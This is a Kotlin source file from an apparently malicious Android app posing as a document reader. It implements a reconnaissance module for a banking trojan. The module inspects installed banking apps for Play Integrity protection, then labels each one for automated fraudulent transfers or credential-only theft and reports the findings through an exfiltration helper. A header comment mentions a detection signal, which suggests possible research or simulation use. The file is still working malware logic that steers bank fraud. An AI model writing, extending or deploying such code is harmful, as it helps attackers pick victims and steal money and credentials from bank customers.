package com.docreader.lite.reader.advanced

import android.content.Context
import android.content.pm.PackageManager
import com.docreader.lite.reader.Exfil
import com.docreader.lite.reader.engine.DynamicLoader

/**
 * Play Integrity probe — attacker-side reconnaissance (Drelock pattern 2026).
 *
 * Banker doesn't USE Play Integrity (that's defender-side).
 * Banker PROBES whether the target banking app integrates PI.
 *
 * Why probe:
 *   - If target app verifies PI verdicts server-side, ATS transfers will be
 *     rejected even if overlay capture succeeds (server sees device_integrity=false
 *     or app_integrity=UNRECOGNIZED on rooted/hooked device)
 *   - Banker can skip ATS on PI-protected apps, focus on unprotected ones
 *   - Drelock: probes PI status → if defended, falls back to credential-only
 *     theft (sell creds on darknet instead of live ATS)
 *
 * Probe methods:
 *   1. Check if target APK depends on play-integrity library (static)
 *   2. Hook target app's IntegrityTokenRequest (dynamic, Frida needed)
 *   3. Monitor network for integrity.googleapis.com calls (passive)
 *   4. Check GMS version — PI requires Play Services 13+
 *
 * Detection: an app querying other apps' dependencies via PackageManager +
 * cross-referencing play-integrity library = reconnaissance signal.
 */
object PlayIntegrityProbe {

    // Play Integrity library signatures in target APK
    private val PI_INDICATORS = listOf(
        "com.google.android.play.core.integrity",         // Play Core library
        "com.google.android.gms.integrity",               // GMS integrity API
        "IntegrityTokenRequest",                           // API class
        "IntegrityTokenResponse",                          // API class
        "IntegrityServiceClient",                          // Service client
        "StandardIntegrityManager",                        // Standard API (2024+)
    )

    // Network indicators for passive detection
    private val PI_NETWORK_INDICATORS = listOf(
        "integrity.googleapis.com",
        "play-integrity",
        "playintegrity",
    )

    // GMS minimum version for PI support
    private const val MIN_GMS_VERSION_FOR_PI = 230815000L  // ~Aug 2023+

    data class ProbeResult(
        val targetPackage: String,
        val hasPlayIntegrity: Boolean,
        val confidence: String,     // "high", "medium", "low"
        val indicators: List<String>,
        val gmsAvailable: Boolean,
        val recommendation: String, // "ats_safe", "credential_only", "skip"
    )

    /**
     * Probe whether a target banking app uses Play Integrity.
     * Returns assessment: ATS-safe, credential-only, or skip.
     */
    fun probeTarget(context: Context, targetPackage: String): ProbeResult {
        val indicators = mutableListOf<String>()

        // Method 1: Check target's declared dependencies via package info
        val hasLibrary = checkTargetDependencies(context, targetPackage, indicators)

        // Method 2: Check if GMS is available and recent enough
        val gmsAvailable = checkGmsVersion(context, indicators)

        // Method 3: Check target's permissions for GMS-related grants
        val hasGmsPerms = checkTargetPermissions(context, targetPackage, indicators)

        // Assess
        val hasPI = hasLibrary || (hasGmsPerms && gmsAvailable)
        val confidence = when {
            hasLibrary -> "high"
            hasGmsPerms && gmsAvailable -> "medium"
            else -> "low"
        }

        val recommendation = when {
            hasPI && confidence == "high" -> "credential_only"
            hasPI && confidence == "medium" -> "credential_only"
            !gmsAvailable -> "ats_safe"       // No GMS = no PI = ATS viable
            else -> "ats_safe"
        }

        val result = ProbeResult(
            targetPackage = targetPackage,
            hasPlayIntegrity = hasPI,
            confidence = confidence,
            indicators = indicators,
            gmsAvailable = gmsAvailable,
            recommendation = recommendation,
        )

        Exfil.event("pi_probe_result",
            "target" to targetPackage,
            "has_pi" to hasPI.toString(),
            "confidence" to confidence,
            "recommendation" to recommendation,
            "indicator_count" to indicators.size.toString()
        )

        return result
    }

    /**
     * Check target APK for Play Integrity library dependencies.
     * Uses PackageManager to inspect target's activities/services/receivers
     * for class names matching PI library patterns.
     */
    private fun checkTargetDependencies(
        context: Context,
        targetPackage: String,
        indicators: MutableList<String>
    ): Boolean {
        try {
            // Get target's package info with all components
            val pkgInfo = context.packageManager.getPackageInfo(
                targetPackage,
                PackageManager.GET_ACTIVITIES or
                    PackageManager.GET_SERVICES or
                    PackageManager.GET_RECEIVERS or
                    PackageManager.GET_PROVIDERS
            )

            // Check component names for PI indicators
            val allComponents = mutableListOf<String>()
            pkgInfo.activities?.forEach { allComponents.add(it.name) }
            pkgInfo.services?.forEach { allComponents.add(it.name) }
            pkgInfo.receivers?.forEach { allComponents.add(it.name) }
            pkgInfo.providers?.forEach { allComponents.add(it.name) }

            for (component in allComponents) {
                for (indicator in PI_INDICATORS) {
                    if (component.contains(indicator, ignoreCase = true)) {
                        indicators.add("component:$component")
                        return true
                    }
                }
            }
        } catch (_: PackageManager.NameNotFoundException) {
            indicators.add("target_not_installed")
        } catch (_: Exception) {}

        return false
    }

    /**
     * Check Google Play Services version.
     * PI requires relatively recent GMS.
     */
    private fun checkGmsVersion(context: Context, indicators: MutableList<String>): Boolean {
        try {
            val gmsInfo = context.packageManager.getPackageInfo(
                "com.google.android.gms", 0
            )
            @Suppress("DEPRECATION")
            val versionCode = gmsInfo.versionCode.toLong()

            if (versionCode >= MIN_GMS_VERSION_FOR_PI) {
                indicators.add("gms_version:${gmsInfo.versionName}")
                return true
            }
        } catch (_: PackageManager.NameNotFoundException) {
            indicators.add("gms_not_installed")
        } catch (_: Exception) {}

        return false
    }

    /**
     * Check target's permissions for GMS integrity indicators.
     */
    private fun checkTargetPermissions(
        context: Context,
        targetPackage: String,
        indicators: MutableList<String>
    ): Boolean {
        try {
            val pkgInfo = context.packageManager.getPackageInfo(
                targetPackage,
                PackageManager.GET_PERMISSIONS
            )
            val permissions = pkgInfo.requestedPermissions ?: return false
            for (perm in permissions) {
                if (perm.contains("gms") || perm.contains("integrity")) {
                    indicators.add("permission:$perm")
                    return true
                }
            }
        } catch (_: Exception) {}

        return false
    }

    /**
     * Batch probe all target banking apps.
     * Returns map of package → recommendation.
     */
    fun probeAllTargets(context: Context, targets: List<String>): Map<String, ProbeResult> {
        val results = mutableMapOf<String, ProbeResult>()
        for (target in targets) {
            results[target] = probeTarget(context, target)
        }

        // Summary exfil
        val atsViable = results.count { it.value.recommendation == "ats_safe" }
        val credOnly = results.count { it.value.recommendation == "credential_only" }
        Exfil.event("pi_probe_batch",
            "total" to targets.size.toString(),
            "ats_viable" to atsViable.toString(),
            "cred_only" to credOnly.toString()
        )

        return results
    }
}
